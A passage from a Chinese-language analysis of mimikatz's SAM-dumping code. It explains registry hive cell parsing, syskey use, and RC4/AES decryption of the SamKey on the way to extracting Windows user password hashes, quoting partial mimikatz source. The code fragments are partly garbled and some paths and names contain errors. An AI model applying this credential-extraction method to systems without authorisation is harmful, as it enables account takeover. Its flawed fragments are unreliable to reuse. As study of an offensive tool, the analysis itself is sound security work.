    wchar_t currentControlSet[] = L"ControlSet000";
    if(kull_m_registry_RegOpenKeyEx(hRegistry, hSystemBase, L"Select", 0, KEY_READ, &hSelect))
    {
        for(i = 0; !status && (i nbElements && !result; i++)
        {
            pKn = (PKULL_M_REGISTRY_HIVE_KEY_NAMED) (hRegistry->pHandleHive->pStartOf + pLfLh->elements[i].offsetNamedKey);
            if(pKn->tag == 'kn')
            {
                if(pKn->flags & KULL_M_REGISTRY_HIVE_KEY_NAMED_FLAG_ASCII_NAME)
                    buffer = kull_m_string_qad_ansi_c_to_unicode((char *) pKn->keyName, pKn->szKeyName);
                else if(buffer = (wchar_t *) LocalAlloc(LPTR, pKn->szKeyName + sizeof(wchar_t)))
                    RtlCopyMemory(buffer, pKn->keyName, pKn->szKeyName);
                if(buffer)
                {
                    if(_wcsicmp(lpSubKey, buffer) == 0)
                        result = pKn;
                    LocalFree(buffer);
                }
            }
        }
        break;
对应的，这里对子键列表巢室的描述如下：
    typedef struct _KULL_M_REGISTRY_HIVE_LF_LH
    {
        LONG szCell;
        WORD tag;
        WORD nbElements;
        KULL_M_REGISTRY_HIVE_LF_LH_ELEMENT elements[ANYSIZE_ARRAY];
    } KULL_M_REGISTRY_HIVE_LF_LH, *PKULL_M_REGISTRY_HIVE_LF_LH;
成员简单但各自的作用都很明显，成员`elements`即我们想要遍历的子键列表，此外`nbElements`是子键列表的长度。
整个过程有点像遍历二叉树，从根节点开始到每个叶子节点，层层递进，知道定位到目标键巢室。这里值得注意的是从键巢室到键巢室，中间是通过子键列表巢室来查询的，即每个键巢室保存了一个指向其子键的列表的偏移，需要查询其子键时就通过这个列表获取对应子键的偏移最终达到定位的目的。
2、 `kull_m_registry_RegQueryInfoKey`，获取键值
打开对应的键之后（定位到对应的键巢室），就是查询相应的键值了，这里同样也有两种情况，即通过`RegQueryInfoKey`这个API直接查询，另一种情况是直接从hive文件获取。首先看如何获取hive文件中的内容，不过这部分操作实际就是从定位到的键巢室把数据拿出来写入到对应的传入的参数，对于键值的获取，则是通过`offsetClassName`成员定位的：
    // kull_m_registry_RegQueryInfoKey
    if(status = (*lpcClass > szInCar))
    {
        RtlCopyMemory(lpClass, &((PKULL_M_REGISTRY_HIVE_BIN_CELL) (hRegistry->pHandleHive->pStartOf + pKn->offsetClassName))->data , pKn->szClassName);
        lpClass[szInCar] = L'\0';
    }
    // kull_m_registry_structures.h
    typedef struct _KULL_M_REGISTRY_HIVE_BIN_CELL
    {
        LONG szCell;
        union{
            WORD tag;
            BYTE data[ANYSIZE_ARRAY];
        };
    } KULL_M_REGISTRY_HIVE_BIN_CELL, *PKULL_M_REGISTRY_HIVE_BIN_CELL;
对于计算机名，存储在`HKLM\SYSTEM\ControlSet000\Current\Control\ComputerName\ComputerName`，通过regedit就可以直接查看到，当然代码中同样也是通过定位巢室来获取(最终都是调用`kull_m_registry_searchValueNameInList`获取对应的键值，和获取密钥的流程一致，只是这里不需要获取多个键值)。但是对于密钥来讲，笔者并未找到通过regedit直接查看的方法。
前面还提到了两个API，即`RegOpenKeyEx`和`RegQueryInfoKey`，在直接读取本地的计算机名和密钥时，直接使用这两个API就要方便的多。首先第一个函数的原型如下：
    LONG RegOpenKeyEx( 
      HKEY hKey, 
      LPCWSTR lpSubKey, 
      DWORD ulOptions, 
      REGSAM samDesired, 
      PHKEY phkResult 
    );
对于第一个参数，一个打开的键或者以下的四个宏：
  * HKEY_LOCAL_MACHINE
  * HKEY_CLASSES_ROOT
  * HKEY_CURRENT_USER
  * HKEY_USERS
其实这四个宏刚好对应到用regedit打开注册表时看到的四个主键，函数执行成功后即打开一个键，返回一个句柄到`phkResilt`，这个句柄可以为下一次调用`RegOpenKeyEx`所使用。对于剩下的三个参数，需要对`samDesired`说明一下，在[msdn](https://docs.microsoft.com/en-us/previous-versions/aa912084\(v=msdn.10)解释是这个参数是保留参数，设置为0，但是mimikatz的代码中这里传递了一个`WinNT.h`中的宏：`KEY_READ`。
第二个函数原型如下：
    LONG RegQueryInfoKey( 
      HKEY hKey, 
      LPWSTR lpClass, 
      LPDWORD lpcbClass, 
      LPDWORD lpReserved, 
      LPDWORD lpcSubKeys, 
      LPDWORD lpcbMaxSubKeyLen, 
      LPDWORD lpcbMaxClassLen, 
      LPDWORD lpcValues, 
      LPDWORD lpcbMaxValueNameLen, 
      LPDWORD lpcbMaxValueLen, 
      LPDWORD lpcbSecurityDescriptor, 
      PFILETIME lpftLastWriteTime 
    );
要达到查询键值的目的，这里重点关注前三个参数，其中`hKey`同`RegOpenKeyEx`，后面两个参数分别对应存储值的缓冲区以及值的大小。
###  获取用户名和用户哈希
解析完SYSTEM，接下来就是SAM了。同样的，首先是打开一个“句柄”，这里的操作和签名的操作完全一致。随后就是查询用户名和用户哈希，不过在这之前先查询了SID，过程和前面查询计算机名一致，只是这里路径换成了`HKLM\SAM\Domains\Account`，键名从`ComputerName`变成了`V`，这个可以通过regedit直接看到：
不过这里获取SID调用了一个API：`ConvertSidToStringSid`，传入的值即`V`对应的部分键值(其实从传入的参数可以大致猜出键值的组成即用户+sid，当然这里不是本文的重点):
    kull_m_string_displaySID((PBYTE) data + szUser - (sizeof(SID) + sizeof(DWORD) * 3));
重点在于用户名及其对应的哈希的获取，大体的流程分三部分：
1、获取SamKey  
2、获取用户名  
3、获取用户哈希
首先是获取SamKey，它的值位于”HKLM\SAM\Domains\Account\F”，不过值本身是加密的，解密密钥是前面从system中获取的syskey，加密算法分两个版本（rc4和aes128），由具体的版本决定采用的加密算法，这里涉及两个结构体：
    typedef struct _SAM_KEY_DATA {
        DWORD Revision;
        DWORD Length;
        BYTE Salt[SAM_KEY_DATA_SALT_LENGTH];
        BYTE Key[SAM_KEY_DATA_KEY_LENGTH];
        BYTE CheckSum[MD5_DIGEST_LENGTH];
        DWORD unk0;
        DWORD unk1;
    } SAM_KEY_DATA, *PSAM_KEY_DATA;
    typedef struct _DOMAIN_ACCOUNT_F {
        WORD Revision;
        WORD unk0;
        DWORD unk1;
        OLD_LARGE_INTEGER CreationTime;
        OLD_LARGE_INTEGER DomainModifiedCount;
        OLD_LARGE_INTEGER MaxPasswordAge;
        OLD_LARGE_INTEGER MinPasswordAge;
        OLD_LARGE_INTEGER ForceLogoff;
        OLD_LARGE_INTEGER LockoutDuration;
        OLD_LARGE_INTEGER LockoutObservationWindow;
        OLD_LARGE_INTEGER ModifiedCountAtLastPromotion;
        DWORD NextRid;
        DWORD PasswordProperties;
        WORD MinPasswordLength;
        WORD PasswordHistoryLength;
        WORD LockoutThreshold;
        DOMAIN_SERVER_ENABLE_STATE ServerState;
        DOMAIN_SERVER_ROLE ServerRole;
        BOOL UasCompatibilityRequired;
        DWORD unk2;
        SAM_KEY_DATA keys1;
        SAM_KEY_DATA keys2;
        DWORD unk3;
        DWORD unk4;
    } DOMAIN_ACCOUNT_F, *PDOMAIN_ACCOUNT_F;
先说`_DOMAIN_ACCOUNT_F`，成员`Revision`的值需为3，才能正确进入后后续的解密流程；成员`keys1`包含了samkey如`_SAM_KEY_DATA`所描述的内容。其他的成员在mimikatz的代码里似乎没有用到，而对于`_SAM_KEY_DATA`来说只适用于加密算法采用rc4的情况，此时对应的`Revision`为1，加密密钥是由成员`Salt`的值作为盐，并用syskey作为密钥采用md5摘要算法生成，然后对成员`Key`进行rc4解密:
    MD5Init(&md5ctx);
    MD5Update(&md5ctx, pDomAccF->keys1.Salt, SAM_KEY_DATA_SALT_LENGTH);
    MD5Update(&md5ctx, kuhl_m_lsadump_qwertyuiopazxc, sizeof(kuhl_m_lsadump_qwertyuiopazxc));
    MD5Update(&md5ctx, sysKey, SYSKEY_LENGTH);
    MD5Update(&md5ctx, kuhl_m_lsadump_01234567890123, sizeof(kuhl_m_lsadump_01234567890123));
    MD5Final(&md5ctx);
    RtlCopyMemory(samKey, pDomAccF->keys1.Key, SAM_KEY_DATA_KEY_LENGTH);
    if(!(status = NT_SUCCESS(RtlDecryptData2(&data, &key))))
采用aes128的时候对应的`Revision`为2，这时候`keys1`会被转换为`PSAM_KEY_DATA_AES`结构体类型，该结构体定义如下：
    typedef struct _SAM_KEY_DATA_AES {
        DWORD Revision; // 2
        DWORD Length;
        DWORD CheckLen;
        DWORD DataLen;
        BYTE Salt[SAM_KEY_DATA_SALT_LENGTH];
        BYTE data[ANYSIZE_ARRAY]; // Data, then Check
    } SAM_KEY_DATA_AES, *PSAM_KEY_DATA_AES;
从结构体成员看二者大差不差，加密流程来看Slat被用作AES加密的IV，syskey则是AES加密的密钥，最后密文即samkey在成员`data`中。解密部分代码如下：
    if(kull_m_crypto_hkey(hProv, CALG_AES_128, pKey, 16, 0, &hKey, NULL))
    {
        if(CryptSetKeyParam(hKey, KP_MODE, (LPCBYTE) &mode, 0))
        {
            if(CryptSetKeyParam(hKey, KP_IV, (LPCBYTE) pIV, 0))
            {
                if(*pOut = LocalAlloc(LPTR, dwDataLen))
                {
                    *dwOutLen = dwDataLen;